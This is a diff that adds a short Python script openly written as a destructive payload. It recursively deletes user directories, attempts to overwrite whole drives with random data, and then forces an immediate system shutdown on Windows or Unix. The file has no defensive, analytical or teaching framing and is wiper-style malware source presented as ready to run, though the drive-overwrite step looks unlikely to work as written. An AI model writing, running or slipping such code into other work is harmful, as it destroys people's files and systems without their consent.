@@ -1,0 +1,46 @@
+import os
+import shutil
+import subprocess
+import sys
+
+# Function to delete files and directories
+def delete_files_and_directories(path):
+    if os.path.isfile(path) or os.path.islink(path):
+        os.unlink(path)  # Remove the file or link
+    elif os.path.isdir(path):
+        shutil.rmtree(path)  # Remove the directory and all its contents
+
+# Function to overwrite the hard drive
+def overwrite_drive():
+    for drive in ["C:", "D:", "E:"]:  # Adjust drive letters as needed
+        if os.path.exists(drive):
+            with open(drive, 'wb') as f:
+                f.write(os.urandom(1024 * 1024 * 1024))  # Overwrite with random data
+
+# Function to disable the system
+def disable_system():
+    if sys.platform == "win32":
+        subprocess.run(["shutdown", "/s", "/f", "/t", "0"])  # Shut down the system immediately (Windows)
+    else:
+        subprocess.run(["shutdown", "-h", "now"])  # Shut down the system immediately (Unix-based)
+
+# Main function to execute the payload
+def execute_payload():
+    # Define paths to critical directories (customize as needed)
+    paths_to_destroy = [
+        "C:\\Users\\Public",  # Example path on Windows
+        "/home/user",  # Example path on Unix-based systems
+    ]
+
+    # Delete files and directories
+    for path in paths_to_destroy:
+        delete_files_and_directories(path)
+
+    # Overwrite the hard drive
+    overwrite_drive()
+
+    # Disable the system
+    disable_system()
+
+if __name__ == "__main__":
+    execute_payload()
